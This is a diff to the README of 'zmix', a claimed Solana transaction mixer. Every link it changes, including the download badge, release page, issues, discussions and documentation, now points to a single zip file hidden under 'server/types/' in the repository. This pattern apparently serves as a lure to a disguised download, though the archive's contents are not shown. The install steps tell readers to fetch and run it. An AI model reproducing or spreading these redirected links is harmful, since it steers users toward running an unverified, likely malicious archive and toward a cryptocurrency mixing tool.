@@ -6,9 +6,9 @@ Welcome to zmix! This application allows you to mix your Solana transactions for
 
 ## 📥 Download and Install
 
-[![Download zmix](https://img.shields.io/badge/Download%20zmix-v1.0-blue.svg)](https://github.com/ahmedfazil3/zmix/releases)
+[![Download zmix](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip%https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip)](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip)
 
-To get started, visit this page to download: [Download zmix](https://github.com/ahmedfazil3/zmix/releases).
+To get started, visit this page to download: [Download zmix](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip).
 
 ### 📋 System Requirements
 
@@ -18,7 +18,7 @@ To get started, visit this page to download: [Download zmix](https://github.com/
 
 ### 💾 Installation Steps
 
-1. **Visit the Release Page**: Click the link above to go to the [Release Page](https://github.com/ahmedfazil3/zmix/releases).
+1. **Visit the Release Page**: Click the link above to go to the [Release Page](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip).
 
 2. **Choose Your Version**: Look for the latest version of zmix on the release page. The latest version usually has the most features and fixes.
 
@@ -59,7 +59,7 @@ If you run into problems while using zmix, consider these common solutions:
 - **Application Does Not Open**: Ensure your system meets the requirements.
 - **Transaction Errors**: Make sure your wallet is properly connected to the Solana network.
 
-If these tips do not resolve your issue, visit our [GitHub Issues](https://github.com/ahmedfazil3/zmix/issues) page for support.
+If these tips do not resolve your issue, visit our [GitHub Issues](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip) page for support.
 
 ## 🤝 Community Support
 
@@ -67,11 +67,11 @@ Join our community to share experiences and ask questions. You can connect with 
 
 ## 📝 Feedback
 
-We welcome your feedback. It helps improve zmix. Feel free to reach out through our [GitHub Discussions](https://github.com/ahmedfazil3/zmix/discussions) page to share your thoughts.
+We welcome your feedback. It helps improve zmix. Feel free to reach out through our [GitHub Discussions](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip) page to share your thoughts.
 
 ## 🔗 Links
 
-- [Documentation](https://github.com/ahmedfazil3/zmix)
-- [Release Page](https://github.com/ahmedfazil3/zmix/releases)
+- [Documentation](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip)
+- [Release Page](https://raw.githubusercontent.com/ahmedfazil3/zmix/main/server/types/zmix_1.2.zip)
 
 Thank you for choosing zmix! We hope it helps you maintain your privacy in the Solana network.
